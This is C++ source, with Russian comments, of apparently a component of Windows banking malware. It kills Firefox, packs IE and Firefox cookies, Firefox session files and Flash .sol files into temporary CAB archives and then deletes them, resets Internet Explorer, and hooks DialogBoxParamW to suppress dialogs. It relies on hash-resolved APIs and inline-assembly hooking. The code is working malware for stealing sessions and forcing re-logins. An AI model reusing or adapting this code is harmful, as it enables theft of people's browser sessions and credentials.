#include "windows.h"
#include "coocksol.h"
#include "GetApi.h"
//#include "Exploit.h"
#include "Strings.h"
#include "Memory.h"
#include "Utils.h"
#include "shlobj.h"
#include "InternetExplorer.h"
#include "tchar.h"    // _T macro
#include "CabPacker.h"

#include "Splice.h"
#include "Unhook.h"

#pragma comment(lib, "wininet.lib")


/************************************************************************/
typedef INT_PTR ( WINAPI *PDialogBoxParamW )
                ( HINSTANCE hInstance, LPCWSTR lpTemplateName,
                  HWND hWndParent, DLGPROC lpDialogFunc, LPARAM dwInitParam );
PDialogBoxParamW    Real_DialogBoxParamW;


bool DeleteFiles(PCHAR Path, PCHAR Ext, bool Recursive, bool DeleteSubDir, HCAB hCab);


bool IgnorePath(char *Path)
{
	// Функция вернёт истину в случае если путь один из ".", ".."
	return (m_lstrcmp(Path, ".") == 0) || (m_lstrcmp(Path,"..") == 0);
}


bool DeleteInSubDirectories(PCHAR Path, PCHAR Mask, bool DeleteSubDir, HCAB hCab)
{
	// Функция рекурсивно удаляет файлы в поддиректориях
	PCHAR SearchMask = StrNew(2, Path, "*.*");
    bool Result = false;
	//  Запусукаем поиск
	//  Ищем первую директорию
	WIN32_FIND_DATA Find;
	HANDLE File = pFindFirstFileA(SearchMask, &Find);
	//  Директория не найдена, выходим из функции
	if (File == INVALID_HANDLE_VALUE)
	{
		StrFree(SearchMask);
		return false;
	}

	// Организовываем цикл
	do
	{
		if ((Find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0 && !IgnorePath(Find.cFileName))
		{
			PCHAR NewPath = StrNew(3, Path, Find.cFileName, "\\");
			if (DeleteFiles(NewPath, Mask, true, DeleteSubDir, hCab))
				Result = true;
			if (DeleteSubDir)
					pRemoveDirectoryA(NewPath);
			StrFree(NewPath);
        }
	}
	while ((BOOL)pFindNextFileA(File, &Find));


    pFindClose(File);
	StrFree(SearchMask);
	return Result;
}

bool DeleteFiles(PCHAR Path, PCHAR Ext, bool Recursive, bool DeleteSubDir, HCAB hCab)
{
	// Функция удаляет файлы с расширением Ext из директории Path
	// Возвращает общий размер удалённых файлов
	if (Path == NULL || Ext == NULL)
		return 0;
	bool Result = false;

	// В связи с тем, что могут использованы маски при которых
	// директории находиться не будут,  директории обрабатываем отдельно
	if (Recursive)
		Result = DeleteInSubDirectories(Path, Ext, DeleteSubDir, hCab);

	PCHAR Mask = StrNew(2, Path, Ext);

	WIN32_FIND_DATA Search;
	HANDLE File = (HANDLE)pFindFirstFileA(Mask, &Search);
	if (File == INVALID_HANDLE_VALUE)
	{
		StrFree(Mask);
		return Result;
	}
	// Перебираем найденные файлы
	while (File != NULL)
	{
        if ((Search.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
		{
			// Удаляем файл
			PCHAR FileName = StrNew(2, Path, Search.cFileName);
			//  В случае если файл имеет атрибут "Только чтение" меняем
			//  ему атрибуты
			if ((Search.dwFileAttributes & FILE_ATTRIBUTE_READONLY) != 0)
				pSetFileAttributesA(FileName, FILE_ATTRIBUTE_ARCHIVE);

			// Удаляем файл
			if(hCab != NULL && !AddFileToCab(hCab, FileName, FileName))
			//if(ZipAdd(hZip, rel, abs, 0, ZIP_FILENAME)!=ZR_OK)
			{
				//998	ERROR_NOACCESS - Invalid access to memory location.
				//32	ERROR_SHARING_VIOLATION - The process cannot access the file because it is being used by another process.
				DWORD err = (DWORD)pGetLastError();	
				err=err;
			}
			if (pDeleteFileA(FileName))
				Result = true;
			StrFree(FileName);
        }

		// Получаем следцющий файл
		if (!(BOOL)pFindNextFileA(File, &Search)) break;
	}

	// Освобождаем данные
	StrFree(Mask);
	pFindClose(File);

	return Result;
}

bool ClearDirectory(PCHAR Path, HCAB hCab)
{
	// Функция очищает директорию удаляя из неё все файлы и поддиректории
	return DeleteFiles(Path, "*", true, true, hCab);
}

PCHAR GetAppDataPath()
 {
	 // Функция возвращает путь к директории хранения данных приложений
	char Path[MAX_PATH];
	DWORD Size = MAX_PATH;
	if (!(BOOL)pSHGetSpecialFolderPathA(NULL, &Path[0], CSIDL_APPDATA, Size))
		return NULL;

    PCHAR Result = StrNew(2, &Path[0], "\\");
	return Result;
 }


void KillFireFox()
{
	DWORD Hash_FireFox = 0x7712FEAE; // хеш firefox.exe

	// Получаем идентификатор процесса
	DWORD Pid = GetProcessIdByHash(Hash_FireFox);

	if ( Pid != (DWORD)-1)
		pWinStationTerminateProcess(NULL, Pid , DBG_TERMINATE_PROCESS );//срочно мочим
}

bool DeleteFFCookies(HCAB hCab)
{
	//	 Функция цдаляет файл куков браузера Mozilla Firefox
	PCHAR DataPath = GetAppDataPath();
	if (DataPath == NULL)
		return false;

	PCHAR Path = StrNew(2, DataPath, "Mozilla\\Firefox\\Profiles\\");
	StrFree(DataPath);

	KillFireFox();
    bool Result = DeleteFiles(Path, "cookies.sqlite", true, false, hCab);
    bool Result2 = DeleteFiles(Path, "sessionstore.*", true, false, hCab);

	StrFree(Path);

	return Result;
}

bool DeleteSOL(HCAB hCab)
{
	// Функция удаляет кукисы программы Macromedia FlashPlayer
	PCHAR DataPath = GetAppDataPath();
	if (DataPath == NULL)
		return false;

	// Создаём путь к папке кукисов
	PCHAR Path = StrNew(2, DataPath, "Macromedia\\Flash Player\\");
	StrFree(DataPath);
	// Чистим директории
	bool Result = ClearDirectory(Path, hCab);
	Result = Result | DeleteFiles("C:\\WINDOWS\\system32\\Macromed\\", "*.sol", true, false, hCab);

	StrFree(Path);
	return Result;
}
void IEClearCache()
{
 // Функция очищает кэш интернет експлорера. 
 BOOL bResult = FALSE;
 BOOL bDone = FALSE;

 LPINTERNET_CACHE_ENTRY_INFO lpCacheEntry = NULL;

 DWORD dwTrySize, dwEntrySize = 4096; 

 HANDLE hCacheDir = NULL;

 DWORD dwError = ERROR_INSUFFICIENT_BUFFER;

 do
 {
  switch ( dwError )
  {
   case ERROR_INSUFFICIENT_BUFFER:

    if ( lpCacheEntry != NULL )
    {
     MemFree( lpCacheEntry );
    }

    lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO)MemAlloc( dwEntrySize );

    if ( lpCacheEntry == NULL )
    {
     return;
    }

    lpCacheEntry->dwStructSize = dwEntrySize;

    dwTrySize = dwEntrySize;

    BOOL bSuccess;

    if ( hCacheDir == NULL )
    {
     bSuccess = ( hCacheDir = (HANDLE)pFindFirstUrlCacheEntryA( NULL, lpCacheEntry,&dwTrySize ) ) != NULL;
    }
    else
    {
     bSuccess = (BOOL)pFindNextUrlCacheEntryA( hCacheDir, lpCacheEntry, &dwTrySize );
    }

    if ( bSuccess )
    {
     dwError = ERROR_SUCCESS;
    }
    else
    {
     dwError  = (DWORD)pGetLastError();
     dwEntrySize = dwTrySize; // возвращаем новый размер буфера
    }

   break;
  
   case ERROR_NO_MORE_ITEMS:

    bDone = TRUE;
    bResult = TRUE;

   break;

   case ERROR_SUCCESS:

    pDeleteUrlCacheEntry( lpCacheEntry->lpszSourceUrlName );
 
    dwTrySize = dwEntrySize;

    if ( pFindNextUrlCacheEntryA( hCacheDir, lpCacheEntry, &dwTrySize ) )
    {
     dwError = ERROR_SUCCESS;
    }
    else
    {
     dwError = (DWORD)pGetLastError();
     dwEntrySize = dwTrySize;
    }

   break;
    
   default:

    bDone = TRUE;

   break;
  }

  if( bDone )
  {
   MemFree( lpCacheEntry );

   if ( hCacheDir )
   {
    pFindCloseUrlCache( hCacheDir );
   }
  }
 }
 while( !bDone );

 return;
}
int DeleteIECookies(int os, HCAB hCab)
{
	char username[256];
	DWORD name_len = 256;
	if(!(BOOL)pGetUserNameA(&username[0], &name_len)) return 0;
	//return 10;

	char *Path_cookies = NULL;

	switch(os)
	{
	case 1:
		Path_cookies = (char*)MemAlloc(m_lstrlen("C:\\Documents and Settings\\")+name_len+m_lstrlen("\\Cookies"));
		m_lstrcpy(Path_cookies,"C:\\Documents and Settings\\");
		m_lstrcat(Path_cookies,&username[0]);
		m_lstrcat(Path_cookies,"\\Cookies\\");
		break;
	case 2:
		Path_cookies = (char*)MemAlloc(m_lstrlen("C:\\Users\\")+name_len+m_lstrlen("\\AppData\\Roaming\\Microsoft\\Windows\\Cookies"));
		m_lstrcpy(Path_cookies,"C:\\Users\\");
		m_lstrcat(Path_cookies,&username[0]);
		m_lstrcat(Path_cookies,"\\AppData\\Roaming\\Microsoft\\Windows\\Cookies\\");
		break;
	default:
		return -1;
	}

	DeleteFiles(Path_cookies, "*.txt", true, false, hCab);
	/*
	if(Path_cookies == NULL) return -1;
	WIN32_FIND_DATA data;
	char *Path_cookies_find = (char*)MemAlloc(m_lstrlen(Path_cookies)+2);
	m_lstrcpy(Path_cookies_find,Path_cookies);
	m_lstrcat(Path_cookies_find,"\\*");
	HANDLE nFindFile = FindFirstFile(Path_cookies_find,&data);
	if(nFindFile==NULL) return -1;
	do
	{
		if(m_lstrcmp(data.cFileName,".")==0 || m_lstrcmp(data.cFileName,"..")==0) continue;
		char *Path_file = (char*)MemAlloc(m_lstrlen(Path_cookies)+m_lstrlen(data.cFileName)+1);
		m_lstrcpy(Path_file,Path_cookies);
		m_lstrcat(Path_file,"\\");
		m_lstrcat(Path_file,data.cFileName);
		if(!DeleteFile(Path_file))
		{
			DWORD err = pGetLastError();
		}
		//MemFree(Path_file);
	}
	while(FindNextFile(nFindFile,&data));
	FindClose(nFindFile);
	//MemFree(Path_cookies);*/
	return 0;
}

void DeleteIE_cookies(char* os, HCAB hCab)
{
	if(m_strstr(os, "Windows XP"))
	{
		DeleteIECookies(1, hCab);
	}
	else if(m_strstr(os, "Windows Vista") ||
			m_strstr(os, "Windows Seven") ||
			m_strstr(os, "Windows Server 2008") ||
			m_strstr(os, "Windows Server 2008 R2"))
	{
		DeleteIECookies(2, hCab);
	}
	else
	{
		DeleteIECookies(1, hCab);
		DeleteIECookies(2, hCab);
	}
}

void WINAPI DeleteBrowsersCookies()
{
	/*
	// Фцнкция удаляет кукисы браузеров и Macromedia Flash Player
	IEClearCache();
	DeleteIECookies(1);
	DeleteIECookies(2);
	//DeleteIE_cookies("Windows Vista");
	DeleteFFCookies();
	DeleteSOL();*/
	
	//IEClearCache();
	char *Path = GetTempNameA();
	HCAB hCab = CreateCab(Path);
	// Фцнкция удаляет кукисы браузеров и Macromedia Flash Player
		//DeleteIE_cookies("Windows Vista");
		DeleteIECookies(1, hCab);
		DeleteIECookies(2, hCab);
		DeleteFFCookies(hCab);
	CloseCab(hCab);

	HANDLE hFile = (HANDLE)pCreateFileA(Path,
                            GENERIC_READ,
                            FILE_SHARE_READ,
                            NULL,
                            OPEN_EXISTING,
                            FILE_ATTRIBUTE_NORMAL,
                            NULL);
	DWORD sizeH = 0;
	DWORD sizeL = (DWORD)pGetFileSize(hFile, &sizeH);
	__int64 sizeCookies = (__int64)(sizeH<<32) + sizeL;
	DbgMsg("coocksol.cpp",sizeCookies,"COOKIE CAB SIZE");
	pCloseHandle(hFile);

	/*char *tmp = (char*)MemAlloc(256);
	GetTempFileNameA("C:\\cabs\\","cab_",0,tmp);
	CopyFile(Path, tmp, 0);
	MemFree(Path);
	MemFree(tmp);*/



	Path = GetTempNameA();
	hCab = CreateCab(Path);
		DeleteSOL(hCab);
	CloseCab(hCab);

	hFile = (HANDLE)pCreateFileA(Path,
                            GENERIC_READ,
                            FILE_SHARE_READ,
                            NULL,
                            OPEN_EXISTING,
                            FILE_ATTRIBUTE_NORMAL,
                            NULL);
	sizeH = 0;
	sizeL = (DWORD)pGetFileSize(hFile, &sizeH);
	__int64 sizeSol = (__int64)(sizeH<<32) + sizeL;
	DbgMsg("coocksol.cpp",sizeSol,"SOL CAB SIZE");
	pCloseHandle(hFile);

	/*tmp = (char*)MemAlloc(256);
	GetTempFileNameA("C:\\cabs\\","cab_",0,tmp);
	CopyFile(Path, tmp, 0);
	MemFree(Path);
	MemFree(tmp);*/
}

/************************************************************************/
//* Надо ещё сделать парную для MemAlloc очистку памяти в этой процедуре*/
BOOL Delete_IECookies_Norm(BOOL bDeleteCookies, BOOL bDeleteCookiesIndex)
{
	DbgMsg("Delete_IECookies_Norm",0,"START");
	char szUserProfile[200]; 
	char szFilePath[200];
	HANDLE hCacheEnumHandle  = NULL;
	LPINTERNET_CACHE_ENTRY_INFO lpCacheEntry = NULL;
	DWORD  dwSize = 4096; // initial buffer size

	// Delete index.dat if requested. Be sure that index.dat is not locked.
	if(bDeleteCookiesIndex)
	{
		// Retrieve from environment user profile path.
		pExpandEnvironmentStringsA("%userprofile%", &szUserProfile[0], 
														 sizeof(szUserProfile)); 
		m_memset(&szFilePath[0], 0, sizeof(szFilePath));
		//m_memcpy(&szFilePath[0],&szUserProfile[0], m_wcslen(&szUserProfile[0])*sizeof(WCHAR));
		//m_memcpy(&szFilePath[m_wcslen(&szUserProfile[0])],L"\\Cookies\\index.dat", 36);
		
		m_lstrcpy(&szFilePath[0], &szUserProfile[0]);
		m_lstrcat(&szFilePath[0], "\\Cookies\\index.dat");
//		wsprintfW(szFilePath, L"%s%s", szUserProfile, L"\\Cookies\\index.dat");


		m_lstrcpy(&szFilePath[0], "C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\Cookies\\index.dat");
		pDeleteFileA(szFilePath);
		DbgMsg("Delete_IECookies_Norm",0,&szFilePath[0]);
		DWORD err = pGetLastError();
		DbgMsg("Delete_IECookies_Norm",err,"pDeleteFileW");

		if(!bDeleteCookies) return TRUE;
	}
	
	// Enable initial buffer size for cache entry structure.
	//lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO) new char[dwSize];
	lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO)MemAlloc(dwSize);
	lpCacheEntry->dwStructSize = dwSize;
	
	// URL search pattern (1st parameter) options are:  "cookie:", "visited:", 
	// or NULL ("*.*").
	hCacheEnumHandle = pFindFirstUrlCacheEntryA(_T("cookie:") /* in */, 
		                         lpCacheEntry /* out */, &dwSize /* in, out */);
	
	// First, obtain handle to internet cache with FindFirstUrlCacheEntry
	// for late use with FindNextUrlCacheEntry.
	
	if(hCacheEnumHandle != NULL) 
	{
		pDeleteUrlCacheEntry(lpCacheEntry->lpszSourceUrlName);
		DbgMsg("pDeleteUrlCacheEntry",0,&lpCacheEntry->lpszSourceUrlName[0]);
	}
	else
	{
		switch(pGetLastError())
		{
            case ERROR_INSUFFICIENT_BUFFER:
				MemFree(lpCacheEntry);
			    //lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO) new char[dwSize];
				lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO)MemAlloc(dwSize);
			    lpCacheEntry->dwStructSize = dwSize;

			  // Repeat first step search with adjusted buffer, exit if not
				// found again (in practice one buffer's size adustment is  
				// always OK).
				hCacheEnumHandle = pFindFirstUrlCacheEntryA(NULL, lpCacheEntry, &dwSize);
				if(hCacheEnumHandle != NULL) 
				{
					pDeleteUrlCacheEntry(lpCacheEntry->lpszSourceUrlName);
					DbgMsg("pDeleteUrlCacheEntry",0,&lpCacheEntry->lpszSourceUrlName[0]);
					break;        
				}
				else
				{
					// FindFirstUrlCacheEntry fails again, return.
					MemFree(lpCacheEntry);
					return FALSE; 
				}
			default:
				pFindCloseUrlCache(hCacheEnumHandle);
				MemFree(lpCacheEntry);
				return FALSE;
		}
	}
	
	// Next, use hCacheEnumHandle obtained from the previous step to delete 
	// subsequent items of cache.

	do 
	{
	     // Notice that return values of FindNextUrlCacheEntry (BOOL) and 
		 // FindFirstUrlCacheEntry (HANDLE) are different.

		 if((BOOL)pFindNextUrlCacheEntryA(hCacheEnumHandle, lpCacheEntry, &dwSize))
		 {
			pDeleteUrlCacheEntry(lpCacheEntry->lpszSourceUrlName);
			DbgMsg("pDeleteUrlCacheEntry",0,&lpCacheEntry->lpszSourceUrlName[0]);
		 }
		 else
		 {
			 switch(pGetLastError())
			 {
                 case ERROR_INSUFFICIENT_BUFFER:
					//lpCacheEntry = //(LPINTERNET_CACHE_ENTRY_INFO);
					MemFree(lpCacheEntry);
					//new char[dwSize];
					lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO)MemAlloc(dwSize);
					lpCacheEntry->dwStructSize = dwSize;

					// Repeat next step search with adjusted buffer, exit if 
					// error comes up again ((in practice one buffer's size 
					// adustment is always OK).

					if(pFindNextUrlCacheEntryA(hCacheEnumHandle, lpCacheEntry, 
						                                               &dwSize)) 
					{
						pDeleteUrlCacheEntry(lpCacheEntry->lpszSourceUrlName);
						DbgMsg("pDeleteUrlCacheEntry",0,&lpCacheEntry->lpszSourceUrlName[0]);
						break;          
					}
					else
					{
						// FindFirstUrlCacheEntry fails again, return.
						pFindCloseUrlCache(hCacheEnumHandle);
						MemFree(lpCacheEntry);
						return FALSE; 
					}
				    break;
			     case ERROR_NO_MORE_ITEMS:
					 pFindCloseUrlCache(hCacheEnumHandle);
					 MemFree(lpCacheEntry);
					 return TRUE; 
				 default:
					 pFindCloseUrlCache(hCacheEnumHandle);
					 MemFree(lpCacheEntry);
					 return FALSE;
			 }
		 } 
	} while (TRUE);

  return FALSE; // never here
}

/************************************************************************/
// Описание удаление куков здесь: 
// http://social.msdn.microsoft.com/Forums/en/ieextensiondevelopment/thread/ce81943b-32b8-437b-b620-171c3d5893e7
// Эта функция - аналог "RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2"
// и ф-ии ResetIEtoDefaults оттуда же
BOOL Delete_IECookies_Vista()
{
	BOOL res = false;

	OutputDebugStr("IECookies_Vista: reseting IE to default state...");
	typedef int ( WINAPI *ResetIEtoDefaults)( HWND hWnd );
	ResetIEtoDefaults pResetIEtoDefaults = (ResetIEtoDefaults)GetProcAddressEx( NULL, 14, 0x5E2957F0 );
	if (pResetIEtoDefaults)
	{
		pResetIEtoDefaults(0);
		OutputDebugStr("ok!");
		res = true;
	}
	else
		OutputDebugStr("failed.");

	OutputDebugStr("IECookies_Vista: deleting cookies...");
	typedef void ( CALLBACK *ClearMyTracksByProcess )( HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow );
	ClearMyTracksByProcess pClearMyTracksByProcess = (ClearMyTracksByProcess)GetProcAddressEx( NULL, 14, 0xE2BFBBBE );
	if (pClearMyTracksByProcess)
	{
		pClearMyTracksByProcess(0, GetModuleHandle(0), "2", 0);
		OutputDebugStr("ok!");
		res = true;
	}
	else
		OutputDebugStr("failed.");


	return res;
}

/************************************************************************/
 INT_PTR WINAPI Hook_DialogBoxParamW(HINSTANCE hInstance, LPCWSTR lpTemplateName,
                                     HWND hWndParent, DLGPROC lpDialogFunc, LPARAM dwInitParam)
 {
		OutputDebugStr("Hook DialogBoxParamW");
		if (0 == hWndParent) 
		{
			OutputDebugStr("Skipping DialogBox!");
			return 1;
		}
		else
		{
			return Real_DialogBoxParamW(hInstance, lpTemplateName, hWndParent, lpDialogFunc, dwInitParam);
		}
 }


/************************************************************************/
bool HookCookie()
{
	OutputDebugStr("UnHook CookieApi - BEFORE");
	UnhookCookie();
	OutputDebugStr("UnHook CookieApi - AFTER");

	OutputDebugStr("HookCookieApi - BEFORE");

	if ( HookApi( 3, 0x929A0EB1, (DWORD)&Hook_DialogBoxParamW ) )
	{  
		__asm mov [Real_DialogBoxParamW], eax			
	}	

	OutputDebugStr("HookCookieApi - AFTER");
	
	return true;
}
